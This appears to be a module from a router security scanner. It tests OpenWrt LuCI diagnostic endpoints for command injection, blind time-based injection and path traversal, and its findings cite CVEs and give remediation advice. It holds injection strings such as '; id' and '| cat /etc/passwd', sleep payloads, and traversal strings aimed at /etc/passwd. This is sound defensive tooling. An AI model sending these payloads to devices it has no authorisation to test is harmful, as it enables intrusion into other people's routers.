"""
luci_sky.checks.injection — command injection and path traversal checks.

Checks: CommandInjection, PathTraversal, TimeBasedInjection
"""
from __future__ import annotations

import re
import time
from typing import List

from luci_sky.checks.base import Check
from luci_sky.checks import register
from luci_sky.config import Config
from luci_sky.models import Category, Confidence, Finding, ScanMode, Severity, Target

_COMMAND_INDICATORS = [
    re.compile(r"uid=\d+\(\w+\)\s+gid=\d+"),           # id output
    re.compile(r"root@\w"),                              # root prompt
    re.compile(r"/bin/sh|/bin/bash"),                    # shell reference
    re.compile(r"drwx\w+\s+\d+\s+root"),                # ls -la output
    re.compile(r"Linux\s+\S+\s+\d+\.\d+\.\d+"),         # uname -a
    re.compile(r"OpenWrt\s+\S+\s+\#"),                  # OpenWrt shell
    re.compile(r"\d+\s+packets\s+transmitted"),          # ping output
    re.compile(r"\$\s*$|#\s*$"),                        # shell prompt
]

_INJECT_PAYLOADS = [
    "; id",
    "| id",
    "` id`",
    "; whoami",
    "$(id)",
    "\n id\n",
    "&& id",
    "| cat /etc/passwd",
]

_INJECTION_ENDPOINTS = [
    ("/cgi-bin/luci/;stok=/rpc/call", "POST", {"method": "exec", "params": ["ping", ["-c1", "127.0.0.1"]]}),
    ("/cgi-bin/luci/admin/diagnostics/ping", "POST", {"host": "127.0.0.1"}),
    ("/cgi-bin/luci/admin/diagnostics/traceroute", "POST", {"host": "127.0.0.1"}),
    ("/cgi-bin/luci/admin/diagnostics/nslookup", "POST", {"host": "127.0.0.1"}),
]

_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\etc\\passwd",
    "%00/../../../etc/passwd",
]

_PASSWD_INDICATORS = [
    re.compile(r"root:x?:0:0:"),
    re.compile(r"nobody:x?:\d+:\d+:"),
    re.compile(r":/bin/sh$", re.MULTILINE),
    re.compile(r":/var:/bin/false$", re.MULTILINE),
]


@register
class CommandInjection(Check):
    """Test for OS command injection in LuCI diagnostic endpoints."""

    id = "command_injection"
    name = "Command Injection Check"
    category = Category.INJECTION
    severity = Severity.CRITICAL
    min_mode = ScanMode.ACTIVE
    requires_auth = False
    description = (
        "Tests diagnostic endpoints for command injection via malicious payloads. "
        "Uses baseline comparison and indicator pattern matching."
    )
    cve_ids: List[str] = ["CVE-2022-46623"]

    def run(self, target: Target, session: object, config: Config) -> List[Finding]:
        findings: List[Finding] = []

        for path, method, base_data in _INJECTION_ENDPOINTS:
            url = f"{target.url}{path}"

            # Get baseline response
            try:
                if method == "POST":
                    baseline_resp = session.post(url, data=base_data)
                else:
                    baseline_resp = session.get(url, params=base_data)

                if baseline_resp.status_code in (403, 404, 401):
                    continue  # No access

                baseline_text = baseline_resp.text or ""
                baseline_len = len(baseline_text)

            except Exception:
                continue

            # Test each injection payload
            for payload in _INJECT_PAYLOADS:
                inject_data = {k: str(v) + payload for k, v in base_data.items()}
                try:
                    if method == "POST":
                        inject_resp = session.post(url, data=inject_data)
                    else:
                        inject_resp = session.get(url, params=inject_data)

                    inject_text = inject_resp.text or ""

                    # Count indicator matches
                    match_count = sum(
                        1 for pat in _COMMAND_INDICATORS if pat.search(inject_text)
                    )
                    length_increase = len(inject_text) > baseline_len * 1.5 and len(inject_text) > baseline_len + 100

                    if match_count >= 2 or (match_count >= 1 and length_increase):
                        evidence = self._sanitize(
                            f"Endpoint: {url}\nPayload: {payload}\n"
                            f"Response snippet: {inject_text[:300]}"
                        )
                        findings.append(self._make_finding(
                            title=f"Command injection detected at {path}",
                            description=(
                                f"The endpoint {path} is vulnerable to OS command injection. "
                                f"Payload '{payload}' produced output matching {match_count} "
                                "command indicator patterns."
                            ),
                            evidence=evidence,
                            affected_url=url,
                            remediation=(
                                "Sanitize all user input before passing to OS commands. "
                                "Use a whitelist for allowed diagnostic targets. "
                                "Update to a patched version."
                            ),
                            severity=Severity.CRITICAL,
                            cvss_score=8.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
                            references=[
                                "https://nvd.nist.gov/vuln/detail/CVE-2022-46623",
                                "https://owasp.org/www-community/attacks/Command_Injection",
                            ],
                            cve_ids=["CVE-2022-46623"],
                        ))
                        return findings  # One confirmed finding is enough
                except Exception:
                    continue

        return findings


@register
class PathTraversal(Check):
    """Test for path traversal vulnerabilities in file-serving endpoints."""

    id = "path_traversal"
    name = "Path Traversal Check"
    category = Category.INJECTION
    severity = Severity.HIGH
    min_mode = ScanMode.ACTIVE
    requires_auth = False
    description = "Tests common traversal payloads against file-serving endpoints."
    cve_ids: List[str] = ["CVE-2013-0229"]

    def run(self, target: Target, session: object, config: Config) -> List[Finding]:
        findings: List[Finding] = []

        test_endpoints = [
            f"{target.url}/cgi-bin/luci/admin/system/flashops/",
            f"{target.url}/cgi-bin/luci/",
            f"{target.url}/",
        ]

        for base_url in test_endpoints:
            for payload in _TRAVERSAL_PAYLOADS:
                test_url = f"{base_url}{payload}"
                try:
                    resp = session.get(test_url)
                    body = resp.text or ""

                    matched = [pat for pat in _PASSWD_INDICATORS if pat.search(body)]
                    if matched:
                        findings.append(self._make_finding(
                            title=f"Path traversal: /etc/passwd content exposed",
                            description=(
                                f"The URL {test_url} returned content that matches /etc/passwd "
                                "patterns. An attacker can read arbitrary system files."
                            ),
                            evidence=self._sanitize(
                                f"GET {test_url} → HTTP {resp.status_code}\n"
                                f"Content snippet: {body[:200]}"
                            ),
                            affected_url=test_url,
                            remediation=(
                                "Validate and sanitize all file path inputs. "
                                "Reject requests containing '../' sequences. "
                                "Ensure uhttpd document root is properly restricted."
                            ),
                            severity=Severity.HIGH,
                            cvss_score=7.5,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                            references=[
                                "https://nvd.nist.gov/vuln/detail/CVE-2013-0229",
                                "https://owasp.org/www-community/attacks/Path_Traversal",
                            ],
                            cve_ids=["CVE-2013-0229"],
                        ))
                        return findings
                except Exception:
                    continue

        return findings


@register
class TimeBasedInjection(Check):
    """Full-mode time-based blind command injection detection."""

    id = "time_based_injection"
    name = "Time-Based Command Injection"
    category = Category.INJECTION
    severity = Severity.CRITICAL
    min_mode = ScanMode.FULL
    requires_auth = False
    description = "Tests for time-based blind command injection via sleep payloads."
    cve_ids: List[str] = ["CVE-2022-46623"]

    _SLEEP_PAYLOADS = [
        "; sleep 5",
        "| sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "&& sleep 5",
    ]

    def run(self, target: Target, session: object, config: Config) -> List[Finding]:
        findings: List[Finding] = []
        url = f"{target.url}/cgi-bin/luci/admin/diagnostics/ping"
        base_payload = {"host": "127.0.0.1"}

        # Baseline timing
        try:
            t0 = time.monotonic()
            session.post(url, data=base_payload)
            t1 = time.monotonic()
            baseline_time = t1 - t0
        except Exception:
            return []

        for sleep_payload in self._SLEEP_PAYLOADS:
            inject_data = {"host": f"127.0.0.1{sleep_payload}"}
            try:
                t2 = time.monotonic()
                session.post(url, data=inject_data)
                t3 = time.monotonic()
                elapsed = t3 - t2
                delta = elapsed - baseline_time

                if delta >= 4.0:
                    findings.append(self._make_finding(
                        title=f"Time-based command injection: {delta:.1f}s delay detected",
                        description=(
                            f"The payload '{sleep_payload}' caused a {delta:.1f}s response delay "
                            f"(baseline: {baseline_time:.2f}s). This confirms blind command injection."
                        ),
                        evidence=(
                            f"Endpoint: {url}\nPayload: {sleep_payload}\n"
                            f"Baseline: {baseline_time:.2f}s, Injection: {elapsed:.2f}s"
                        ),
                        affected_url=url,
                        remediation=(
                            "Sanitize all input to diagnostic endpoints. "
                            "Whitelist allowed characters for ping targets."
                        ),
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        references=[
                            "https://nvd.nist.gov/vuln/detail/CVE-2022-46623",
                            "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        ],
                        cve_ids=["CVE-2022-46623"],
                    ))
                    return findings
            except Exception:
                continue

        return findings
